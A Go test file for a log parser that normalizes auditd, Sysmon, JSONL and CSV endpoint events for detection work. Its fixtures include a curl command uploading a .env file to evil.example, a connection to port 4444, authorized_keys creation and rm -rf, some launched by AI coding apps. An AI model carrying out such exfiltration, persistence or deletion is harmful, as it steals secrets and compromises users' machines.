package endpoint

import (
	"os"
	"path/filepath"
	"testing"
)

func write(t *testing.T, name, content string) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), name)
	if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestAuditd(t *testing.T) {
	// serial 101: execve with a hex-encoded arg (space inside); 102: connect; 103: file create.
	log := `type=SYSCALL msg=audit(1788084007.123:101): arch=c000003e syscall=59 success=yes exit=0 ppid=4400 pid=4411 auid=1000 uid=1000 comm="rm" exe="/usr/bin/rm" key="exec"
type=EXECVE msg=audit(1788084007.123:101): argc=3 a0="rm" a1="-rf" a2=6275696C64206F7574
type=CWD msg=audit(1788084007.123:101): cwd="/home/dev/proj"
type=PATH msg=audit(1788084007.123:101): item=0 name="/usr/bin/rm" nametype=NORMAL
type=SYSCALL msg=audit(1788084010.500:102): arch=c000003e syscall=42 success=yes exit=0 ppid=4400 pid=4412 uid=1000 comm="curl" exe="/usr/bin/curl"
type=SOCKADDR msg=audit(1788084010.500:102): saddr=02001F90C0A8010500000000
type=SYSCALL msg=audit(1788084012.000:103): arch=c000003e syscall=257 success=yes exit=3 a2=241 ppid=4400 pid=4413 uid=1000 comm="python3" exe="/usr/bin/python3"
type=CWD msg=audit(1788084012.000:103): cwd="/home/dev"
type=PATH msg=audit(1788084012.000:103): item=1 name=".ssh/authorized_keys" nametype=CREATE
garbage line that is not audit
`
	p := write(t, "audit.log", log)
	f, err := Sniff(p)
	if err != nil || f != FormatAuditd {
		t.Fatalf("sniff: %v %s", err, f)
	}
	res, err := Load(p, FormatAuto)
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Records) != 3 || res.Skipped != 1 {
		t.Fatalf("records=%d skipped=%d %+v", len(res.Records), res.Skipped, res.Records)
	}
	r := res.Records[0]
	if r.Kind != "process" || r.Cmdline != "rm -rf build out" || r.PID != 4411 || r.PPID != 4400 || r.Exe != "/usr/bin/rm" || r.User != "1000" {
		t.Fatalf("execve: %+v", r)
	}
	if r.Time.Format("2006-01-02T15:04:05.000Z") != "2026-08-30T10:00:07.123Z" {
		t.Fatalf("time: %v", r.Time)
	}
	n := res.Records[1]
	if n.Kind != "network" || n.DestIP != "192.168.1.5" || n.DestPort != 8080 || n.Exe != "/usr/bin/curl" {
		t.Fatalf("sockaddr: %+v", n)
	}
	fl := res.Records[2]
	if fl.Kind != "file" || fl.FilePath != "/home/dev/.ssh/authorized_keys" || fl.FileOp != "create" {
		t.Fatalf("path: %+v", fl)
	}
	// IPv6 saddr
	ip, port := decodeSaddr("0A0001BB00000000" + "20010DB8000000000000000000000001" + "00000000")
	if ip != "2001:db8:0:0:0:0:0:1" || port != 443 {
		t.Fatalf("ipv6: %s %d", ip, port)
	}
}

func TestSysmonXML(t *testing.T) {
	xmlDoc := `<?xml version="1.0" encoding="utf-8"?>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>1</EventID><TimeCreated SystemTime="2026-08-30T10:00:07.1230000Z"/><EventRecordID>77</EventRecordID></System>
<EventData><Data Name="UtcTime">2026-08-30 10:00:07.123</Data><Data Name="ProcessId">4411</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="CommandLine">cmd.exe /c rmdir /s /q build</Data><Data Name="ParentProcessId">4400</Data><Data Name="ParentImage">C:\Users\dev\AppData\Local\Programs\cursor\Cursor.exe</Data><Data Name="User">DESK\dev</Data></EventData></Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>3</EventID><TimeCreated SystemTime="2026-08-30T10:00:10.0000000Z"/><EventRecordID>78</EventRecordID></System>
<EventData><Data Name="UtcTime">2026-08-30 10:00:10.000</Data><Data Name="ProcessId">4412</Data><Data Name="Image">C:\Program Files\nodejs\node.exe</Data><Data Name="DestinationIp">185.10.10.10</Data><Data Name="DestinationPort">4444</Data><Data Name="DestinationHostname">-</Data></EventData></Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>11</EventID><TimeCreated SystemTime="2026-08-30T10:00:12.0000000Z"/><EventRecordID>79</EventRecordID></System>
<EventData><Data Name="UtcTime">2026-08-30 10:00:12.000</Data><Data Name="ProcessId">4413</Data><Data Name="Image">C:\Program Files\nodejs\node.exe</Data><Data Name="TargetFilename">C:\Users\dev\.ssh\authorized_keys</Data></EventData></Event>
`
	p := write(t, "sysmon.xml", xmlDoc)
	res, err := Load(p, FormatAuto)
	if err != nil {
		t.Fatal(err)
	}
	if res.Format != FormatSysmon || len(res.Records) != 3 {
		t.Fatalf("format=%s records=%d problems=%v", res.Format, len(res.Records), res.Problems)
	}
	if r := res.Records[0]; r.Kind != "process" || r.Cmdline != "cmd.exe /c rmdir /s /q build" || r.PPID != 4400 || baseName(r.ParentExe) != "Cursor.exe" {
		t.Fatalf("event 1: %+v", r)
	}
	if r := res.Records[1]; r.Kind != "network" || r.DestIP != "185.10.10.10" || r.DestPort != 4444 {
		t.Fatalf("event 3: %+v", r)
	}
	if r := res.Records[2]; r.Kind != "file" || r.FileOp != "create" || r.FilePath != `C:\Users\dev\.ssh\authorized_keys` {
		t.Fatalf("event 11: %+v", r)
	}
}

func TestGenericJSONLAndCSV(t *testing.T) {
	// eslogger (macOS) nested exec + Velociraptor-style flat rows + evtx_dump-style nested Event.
	jsonl := `{"time":"2026-08-30T10:00:07.123Z","event_type":9,"process":{"audit_token":{"pid":4400},"ppid":300,"executable":{"path":"/Applications/Claude.app/Contents/MacOS/Claude"}},"event":{"exec":{"target":{"executable":{"path":"/bin/zsh"},"audit_token":{"pid":4411},"ppid":4400},"args":["/bin/zsh","-c","rm -rf build"]}}}
{"Timestamp":"2026-08-30 10:00:10","Pid":4412,"Ppid":4411,"Exe":"/usr/bin/curl","CommandLine":"curl -F f=@.env https://evil.example/up","Username":"dev"}
{"Event":{"System":{"EventID":3,"TimeCreated":{"#attributes":{"SystemTime":"2026-08-30T10:00:11Z"}}},"EventData":{"ProcessId":4412,"Image":"C:\\curl.exe","DestinationIp":"203.0.113.9","DestinationPort":443}}}
{"no":"timestamp here"}
`
	p := write(t, "events.jsonl", jsonl)
	res, err := Load(p, FormatAuto)
	if err != nil {
		t.Fatal(err)
	}
	if res.Format != FormatJSONL || len(res.Records) != 3 || res.Skipped != 1 {
		t.Fatalf("format=%s records=%d skipped=%d problems=%v", res.Format, len(res.Records), res.Skipped, res.Problems)
	}
	es := res.Records[0]
	if es.Kind != "process" || es.Cmdline != "/bin/zsh -c rm -rf build" || es.Exe != "/bin/zsh" {
		t.Fatalf("eslogger: %+v", es)
	}
	if r := res.Records[1]; r.Kind != "process" || r.PID != 4412 || r.User != "dev" {
		t.Fatalf("flat: %+v", r)
	}
	if r := res.Records[2]; r.Kind != "network" || r.DestIP != "203.0.113.9" || r.DestPort != 443 {
		t.Fatalf("evtx_dump: %+v", r)
	}

	csvDoc := "EventTime,Pid,Ppid,Exe,CommandLine,Username\n" +
		"2026-08-30 10:00:07,4411,4400,/usr/bin/rm,\"rm -rf build\",dev\n" +
		"2026-08-30 10:00:09,4415,4411,/usr/bin/git,\"git push origin main\",dev\n"
	p2 := write(t, "procs.csv", csvDoc)
	res2, err := Load(p2, FormatAuto)
	if err != nil {
		t.Fatal(err)
	}
	if res2.Format != FormatCSV || len(res2.Records) != 2 || res2.Records[1].Cmdline != "git push origin main" {
		t.Fatalf("csv: %+v", res2)
	}
}
